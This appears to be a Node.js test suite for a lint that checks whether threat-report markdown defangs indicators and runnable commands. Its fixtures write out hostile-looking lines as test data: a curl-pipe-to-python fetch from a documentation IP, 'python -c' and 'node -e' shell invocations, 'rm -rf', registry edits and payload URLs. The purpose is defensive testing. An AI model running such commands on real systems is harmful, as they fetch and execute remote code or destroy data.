'use strict';
/* T-0500.1.12 part harden: the cross-provider review of the defang lint (Sol, review_a84e0d5e90cc4692) returned 28 fixtures; each is a
   case here, with the verdict the rules give it, plus the benign twin of each failing case. They use only run() and the allow file, so the
   same file runs against the PRE-HARDENING lint (DEFANG_LINT=<path to the old check-defang.js>): every case that expects FAIL must then
   fail the test (control: the old lint passed them). tasks/runs/T-0500.1.12/harden/old-vs-new.txt records that run.

   Verdict per fixture. Sol's expected FAIL stands for 26 of 28. Two it called FAIL are PASS by lead decision 3 (a block that is a whole
   program rather than a paste-and-run line is acceptable once its indicators are defanged): python-executable and javascript-script.
   Their twins that ARE commands (`python -c ...`, `node -e ...`, `curl | python`) FAIL here.
   Fixture addresses are RFC 5737 documentation ranges; names are inert. */
var test = require('node:test');
var assert = require('node:assert');
var fs = require('node:fs');
var os = require('node:os');
var path = require('node:path');
var L = require(process.env.DEFANG_LINT || '../check-defang.js');

function lint(md, allowText, opts) {
  opts = opts || {};
  var tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'hl-defang-review-'));
  try {
    var rep = path.join(tmp, 'rep'); fs.mkdirSync(rep);
    fs.writeFileSync(path.join(rep, 'index.md'), md);
    var allowFiles = [];
    if (allowText !== null && allowText !== undefined) { var af = path.join(tmp, 'allow.txt'); fs.writeFileSync(af, allowText); allowFiles.push(af); }
    var R = L.run(opts.singleFile ? path.join(rep, 'index.md') : rep, allowFiles);
    return { kinds: R.findings.map(function (f) { return f.kind; }).sort(), findings: R.findings, stats: R.stats };
  } finally { fs.rmSync(tmp, { recursive: true, force: true }); }
}
function fails(md, allowText) { var r = lint(md, allowText); assert.ok(r.kinds.length > 0, 'expected a FAIL, got PASS'); return r; }
function passes(md, allowText) { var r = lint(md, allowText); assert.deepStrictEqual(r.kinds, [], 'expected PASS, got ' + r.kinds.join(',')); return r; }
var H = '# Fixture\n\n';

/* ---- the 28 review fixtures, as reported ---- */

test('review fixture raw-url, raw-ip, raw-domain, raw-ws FAIL; canonical-ws and bare-ws PASS (baseline)', function () {
  fails(H + 'http://198.51.100.17/p\n');
  fails(H + '198.51.100.17\n');
  fails(H + 'evil.attacker-test.com\n');
  fails(H + 'ws://198.51.100.17:8080/a.b\n');
  passes(H + 'ws://198[.]51[.]100[.]17:8080/a.b\n');
  passes(H + 'WebSocket (ws://) scheme\n');
});

test('review fixture bare-command FAILs; its bracketed twin PASSes', function () {
  fails(H + '```bash\nreg add HKCU\\Software\\Test /v x /d y\n```\n');
  passes(H + '```bash\n[r]eg add HKCU\\Software\\Test /v x /d y\n```\n');
});

test('review fixtures comment-bracket-bypass and argument-bracket-bypass FAIL: a bracket in a comment or an argument is not a bracketed command', function () {
  fails(H + '```bash\n# [p]owershell is the name\nreg add HKCU\\Software\\Test /v x /d y\n```\n');
  fails(H + '```bash\nreg add HKCU\\Software\\Test /v label /d "[p]owershell"\n```\n');
  // twins: the command itself bracketed, the comment and the argument kept
  passes(H + '```bash\n# [p]owershell is the name\n[r]eg add HKCU\\Software\\Test /v x /d y\n```\n');
  passes(H + '```bash\n[r]eg add HKCU\\Software\\Test /v label /d "[p]owershell"\n```\n');
});

test('review fixture list-partially-bracketed FAILs on the bare line; the fully bracketed list PASSes', function () {
  var r = fails(H + '```console\n[r]eg query HKCU\\Software\nreg add HKCU\\Software\\Test /v x /d y\n```\n');
  assert.ok(r.kinds.indexOf('ATTACKER-COMMAND-LINE') !== -1, r.kinds.join(','));
  passes(H + '```console\n[r]eg query HKCU\\Software\n[r]eg add HKCU\\Software\\Test /v x /d y\n```\n');
});

test('review fixture mislabeled-command FAILs: a data tag never exempts a command; real json PASSes', function () {
  fails(H + '```json\nreg add HKCU\\Software\\Test /v x /d y\n```\n');
  passes(H + '```json\n{"cmd": "reg add x", "k": 1}\n```\n');
  passes(H + '```json\n[r]eg add HKCU\\Software\\Test /v x /d y\n```\n');
});

test('review fixtures python-executable and javascript-script: a whole program PASSes once its indicators are defanged (decision 3); a one-line interpreter invocation is a command and FAILs', function () {
  passes(H + '```python\nimport os\nos.system("whoami")\n```\n');
  passes(H + '```javascript\nconst cp = require("child_process");\ncp.execSync("whoami");\n```\n');
  // the same programs with a network indicator FAIL (raw-url-in-python)
  fails(H + '```python\nurl="http://198.51.100.17/payload"\n```\n');
  fails(H + '```javascript\nfetch("http://198.51.100.17/payload");\n```\n');
  passes(H + '```python\nurl="hxxp://198[.]51[.]100[.]17/payload"\n```\n');
  // paste-and-run invocations
  fails(H + '```bash\npython -c "import os; os.system(\'whoami\')"\n```\n');
  fails(H + '```bash\nnode -e "require(\'child_process\').execSync(\'whoami\')"\n```\n');
  fails(H + '```bash\ncurl hxxp://198[.]51[.]100[.]17/a | python\n```\n');
  passes(H + '```bash\n[p]ython -c "import os; os.system(\'whoami\')"\n```\n');
  passes(H + '```bash\n[n]ode -e "require(\'child_process\').execSync(\'whoami\')"\n```\n');
  passes(H + '```bash\n[c]url hxxp://198[.]51[.]100[.]17/a | python\n```\n');
  // a one-liner under a python tag is still a command
  fails(H + '```python\nprint(1)\npython -c "import os"\n```\n');
});

test('review fixtures github-actor-path, s3-actor-host, freedns-actor-subdomain FAIL under the old-style allow lines; the scoped allow keeps the benign twin', function () {
  var oldStyle = 'github.com  # old style: the bare host\namazonaws.com  # old\ns3.amazonaws.com  # old\nafraid.org  # old\n';
  fails(H + 'https://github.com/Iamem/payload\n', oldStyle);
  fails(H + 'https://actor-bucket.s3.amazonaws.com/payload.ps1\n', oldStyle);
  fails(H + 'http://actor.afraid.org/payload\n', oldStyle);
  // with a path scope for a benign owner: that owner passes, the actor's path does not, and the bare host in prose does not
  var scoped = 'github.com/ne0nd0g  # the Merlin author, cited as a reference\n';
  passes(H + 'https://github.com/ne0nd0g/merlin\n', scoped);
  passes(H + 'github.com/Ne0nd0g/merlin\n', scoped);
  fails(H + 'https://github.com/Iamem/payload\n', scoped);
  fails(H + 'github.com/ne0nd0g-evil/payload\n', scoped);
  fails(H + 'github.com\n', scoped);
  // defanged twins
  passes(H + 'hxxps://actor-bucket[.]s3[.]amazonaws[.]com/payload.ps1\n');
  passes(H + 'hxxp://actor[.]afraid[.]org/payload\n');
  passes(H + 'hxxps://github[.]com/Iamem/payload\n');
});

test('multi-tenant allow entries: the bare host or suffix is refused and not applied; a named tenant or a path scope is accepted', function () {
  ['github.com', 'gist.github.com', 'api.telegram.org', 'web.archive.org', 'pastebin.com', 'amazonaws.com', 's3.amazonaws.com', 'github.io', 'afraid.org', 'ddns.net', 'discord.com'].forEach(function (e) {
    var r = fails(H + 'see ' + (e === 'github.com' ? 'github.com/x' : e) + ' here\n', e + '  # test: bare entry\n');
    assert.ok(r.kinds.indexOf('ALLOW-MULTI-TENANT') !== -1, e + ': ' + r.kinds.join(','));
  });
  passes(H + 'see itm4n.github.io here and github.com/itm4n/x and api.telegram.org/bot<token>/getMe\n', 'itm4n.github.io  # a named tenant\ngithub.com/itm4n  # one owner\napi.telegram.org/bot*  # the Bot API path\n');
  // no subdomain inheritance, for any allowed host
  fails(H + 'https://docs.vendor.example-attacker.com/a\n', 'vendor.example-attacker.com  # exact host only\n');
  passes(H + 'https://vendor.example-attacker.com/a\n', 'vendor.example-attacker.com  # exact host only\n');
});

test('review fixtures markdown-actor-link, html-actor-link, reference-actor-link FAIL; link text with no target and a link to an allowed page PASS', function () {
  fails(H + '[Download payload](http://198.51.100.17/payload.ps1)\n');
  fails(H + '<a href="http://198.51.100.17/payload.ps1">Download payload</a>\n');
  fails(H + '[Download payload][payload]\n\n[payload]: http://198.51.100.17/payload.ps1\n');
  fails(H + '<img src="http://198.51.100.17/p.png">\n');
  fails(H + 'Open <http://198.51.100.17/payload.ps1> now\n');
  // the link-to-text twin: the text kept, the target dropped (and a defanged form shown)
  passes(H + 'Download payload (hxxp://198[.]51[.]100[.]17/payload.ps1)\n');
  passes(H + 'Download payload\n');
  // links to pages that are not the actor's stay, through the allow file; relative and anchor targets have no host
  passes(H + '[the write-up](https://www.vendor-research.example-attacker.com/post) and [ours](/reports/a/) and [top](#top)\n', 'www.vendor-research.example-attacker.com  # a vendor write-up cited as a reference\n');
  fails(H + '[the write-up](https://blog.vendor-research.example-attacker.com/post)\n', 'www.vendor-research.example-attacker.com  # a vendor write-up cited as a reference\n');
});

test('review fixtures unlisted-tld-domain and raw-ipv6-url FAIL: the TLD list is the whole IANA root zone, and an IPv6 literal in a URL is an indicator', function () {
  fails(H + 'evil-attacker.sh\n');
  passes(H + 'evil-attacker[.]sh\n');
  fails(H + 'beacon at evil.attacker.moe and pswdump.my and wireon.work.gd\n');
  fails(H + 'http://[2001:db8::7]/payload\n');
  fails(H + 'ws://[2001:db8::7]:8080/a\n');
  fails(H + 'hxxp://[2001:db8::7]/payload\n');
  passes(H + 'hxxp://[2001[:]db8[:][:]7]/payload\n');
  passes(H + 'loopback http://[::1]:8080/x and ws://[fe80::1]/x are private\n');
  // a name on a TLD that does not exist is not a domain
  passes(H + 'file name notes.nosuchtld and Net.WebClient\n');
});

test('review fixtures valid-block-exception, block-exception-indicator, stale-existing-file, stale-missing-file, broad-block-exception', function () {
  var cmd = '```bash\nreg query HKCU\\Software\n```\n';
  passes(H + cmd, 'block index.md | reg query  # fixture accepted block\n');
  // the exception excuses the command-block finding only
  fails(H + '```bash\nreg query HKCU\\Software\nhttp://198.51.100.17/payload\n```\n', 'block index.md | reg query  # fixture accepted block\n');
  // stale: matches no block
  fails(H + '# no commands\n', 'block index.md | reg query  # fixture accepted block\n');
  // a missing file: the folder-wide scan fails it (decision 5)
  var miss = fails(H + cmd, 'block index.md | reg query  # ok\nblock nonexistent.md | reg query  # fixture missing block\n');
  assert.ok(miss.kinds.indexOf('STALE-BLOCK-EXCEPTION') !== -1, miss.kinds.join(','));
  fails(H + '# no commands\n', 'block nonexistent.md | reg query  # fixture missing block\n');
  // broad: one exception matching two blocks
  fails(H + cmd + cmd, 'block index.md | reg query  # fixture accepted block\n');
});

test('a one-file run cannot match another page\'s exception: NOT CHECKED, not a failure; a file that does not exist still fails', function () {
  var tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'hl-defang-review-'));
  try {
    var rep = path.join(tmp, 'rep'); fs.mkdirSync(rep);
    fs.writeFileSync(path.join(rep, 'index.md'), H + 'nothing\n');
    fs.writeFileSync(path.join(rep, 'other.md'), '---\nlayout: x\n---\n\n```bash\nreg query a\n```\n');
    var af = path.join(tmp, 'a.txt');
    fs.writeFileSync(af, 'block other.md | reg query  # the other page\n');
    var R = L.run(path.join(rep, 'index.md'), [af]);
    assert.deepStrictEqual(R.findings, []);
    if (R.stats.exceptionsOtherFile) assert.strictEqual(R.stats.exceptionsOtherFile.length, 1);
    fs.writeFileSync(af, 'block gone.md | reg query  # nowhere\n');
    assert.ok(L.run(path.join(rep, 'index.md'), [af]).findings.length > 0);
  } finally { fs.rmSync(tmp, { recursive: true, force: true }); }
});

test('review fixture benign-copy: a block marked {: .hl-copy} keeps its raw values and PASSes', function () {
  passes(H + '```bash\nreg query HKCU\\Software\nhttp://198.51.100.17/payload\n```\n{: .hl-copy}\n');
});

test('command position: the bracket counts at the start of the line, after a pipe, a separator, a subshell paren or an assignment; never in a comment, an argument or a string', function () {
  passes(H + '```bash\n[c]url hxxp://198[.]51[.]100[.]17/a | [b]ash\n```\n');
  passes(H + '```bash\ncurl hxxp://198[.]51[.]100[.]17/a | [b]ash\n```\n');
  passes(H + '```powershell\n$b = [N]ew-Object IO.MemoryStream\n```\n');
  passes(H + '```bash\n$ [s]udo [c]hmod 777 a\n```\n');
  fails(H + '```bash\nchmod 777 a # [c]hmod\n```\n');
  fails(H + '```bash\nchmod 777 "a; [c]hmod b"\n```\n');
  fails(H + '```bash\nrm -rf /tmp/a [r]m\n```\n');
});

test('the denominators are printed: link targets scanned, recognised executable lines, IANA list size', function () {
  var r = lint(H + '[a](hxxp://198[.]51[.]100[.]17/p) [b](/x)\n\n```bash\n[r]eg query a\n```\n', null);
  assert.deepStrictEqual(r.kinds, []);
  assert.strictEqual(r.stats.linkTargets, 1);
  assert.strictEqual(r.stats.linkTargetsNoHost, 1);
});

test('the in-repo allow files hold no bare multi-tenant host, no bare suffix and no entry that is only a subdomain-wide claim', function () {
  var dir = path.join(__dirname, '..', 'defang-allow');
  var checked = 0;
  fs.readdirSync(dir).filter(function (n) { return /\.txt$/.test(n) && n !== '_aliases.txt'; }).forEach(function (n) {
    var a = L.makeAllow([path.join(dir, n)]);
    assert.deepStrictEqual(a.bad, [], n + ': ' + JSON.stringify(a.bad));
    checked++;
  });
  assert.ok(checked >= 40, 'checked ' + checked + ' allow files');
});

test('a path scope cannot be walked out of: dot segments, encoded dots and slashes, and a look-alike owner do not match', function () {
  var scoped = 'github.com/ne0nd0g  # the Merlin author, cited as a reference\n';
  passes(H + 'github.com/ne0nd0g/merlin/blob/master/a.go\n', scoped);
  fails(H + 'https://github.com/ne0nd0g/../Iamem/payload\n', scoped);
  fails(H + 'https://github.com/ne0nd0g/%2e%2e/Iamem/payload\n', scoped);
  fails(H + 'https://github.com/ne0nd0g%2f..%2fIamem/payload\n', scoped);
  fails(H + 'https://github.com@evil.example-attacker.com/ne0nd0g/x\n', scoped);
  fails(H + 'https://github.com./ne0nd0g/x\n', scoped);
  fails(H + 'https://github.com/ne0nd0gx/x\n', scoped);
});

/* T-0500.1.12 r2fix (Sol round 2): F5 a raw domain before "(" and F6 a partly defanged IPv6 host are findings */
test('r2fix F5: a raw domain directly followed by "(" is flagged; the defanged form and an allowed name pass', function () {
  fails(H + 'evil-attacker.sh(foo)\n');
  passes(H + 'evil-attacker[.]sh(foo)\n');
  passes(H + 'call install.sh(foo)\n', 'install.sh  # a script file name in prose\n');
});
test('r2fix F6: a partly defanged IPv6 host (raw colons beside [:]) is a finding; the fully defanged form passes', function () {
  assert.ok(fails(H + 'ws://[2001[:]db8::7]/p\n').kinds.indexOf('IPV6-URL') !== -1);
  assert.ok(fails(H + 'hxxp://[2001[:]db8::7]/p\n').kinds.indexOf('IPV6-URL') !== -1);
  passes(H + 'ws://[2001[:]db8[:][:]7]/p\n');
  passes(H + 'hxxp://[2001[:]db8[:][:]7]/p\n');
});
